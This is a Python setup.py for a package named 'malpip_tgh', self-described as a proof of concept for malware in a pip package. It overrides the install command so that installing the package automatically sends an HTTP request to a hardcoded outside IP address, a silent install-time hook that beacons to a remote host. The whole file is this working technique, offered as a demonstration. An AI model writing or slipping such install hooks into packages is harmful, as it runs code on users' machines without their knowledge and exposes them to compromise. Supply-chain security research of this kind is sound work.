import setuptools
from setuptools.command.install import install
from setuptools.command.develop import develop
import requests

IP = ""
PORT = 1337

def mal():
    requests.get("http://194.233.164.169/holaa")

class AfterDevelop(develop):
    def run(self):
        develop.run(self)

class AfterInstall(install):
    def run(self):
        install.run(self)
        mal()

setuptools.setup(
    name = "malpip_tgh",
    version = "1.0.71",
    author = "TheGoodHacker",
    author_email = "thegoodhackertv@gmail.com",
    description = "Malware in pip package PoC by TheGoodHacker",
    long_description = "long description",
    long_description_content_type = "text/markdown",
    url = "https://github.com/thegoodhackertv/malpip",
    project_urls = {
        "Bug Tracker": "https://github.com/thegoodhackertv/malpip/issues",
    },
    classifiers = [
        "Programming Language :: Python :: 3",
        "License :: OSI Approved :: MIT License",
        "Operating System :: OS Independent",
    ],
    package_dir = {"": "src"},
    packages = setuptools.find_packages(where="src"),
    python_requires = ">=3.6",
    cmdclass={
        'develop': AfterDevelop,
        'install': AfterInstall,
    },
)
